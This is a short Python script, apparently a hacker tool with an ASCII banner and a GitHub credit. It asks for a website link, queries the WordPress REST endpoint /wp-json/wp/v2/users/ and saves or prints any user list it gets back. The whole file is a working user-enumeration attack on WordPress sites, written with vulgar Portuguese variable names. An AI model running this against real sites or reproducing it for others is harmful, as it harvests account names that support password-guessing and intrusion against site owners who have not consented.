import requests

print("                ")
print("        _       ")
print("       | |      ")
print("       | |      ")
print("       | |      ")
print("       | |      ")
print("       | |      ")
print("   ___ | | ___  ")
print("  / _ \\|_|/ _ \\ ")
print(" | | | (_) | | |")
print(" | | | | | | | |")
print(" | |_| |_| |_| |")
print("  \\___/(_)\\___/ ")
print("                ")
print("https://github.com/JhinScripter/")
print("                ")

vai_safada = input("Link: ")
completadinha_fdp = vai_safada + "/wp-json/wp/v2/users/"
putaria_generalizada = requests.get(completadinha_fdp)
if "[{" in putaria_generalizada.text:
    print("Sucesso!")
    try:
        clean_shit = vai_safada.replace("/", "")
        maconha = open(clean_shit + ".sstjs", "w+")
        maconha.write(putaria_generalizada.text)
        print("[Formato JSON] Salvo em: " + clean_shit + ".sstjs")
    except:
        print("Não foi possivel salvar em um arquivo a data, deseja printar no console?")
        lolo = input("S/N --> ")
        if lolo == "s" or lolo == "S":
            print("[Formato JSON]\n" + putaria_generalizada.text + "\n[Formato JSON]")
        else:
            print("Cya.")
else:
    print("Erro!")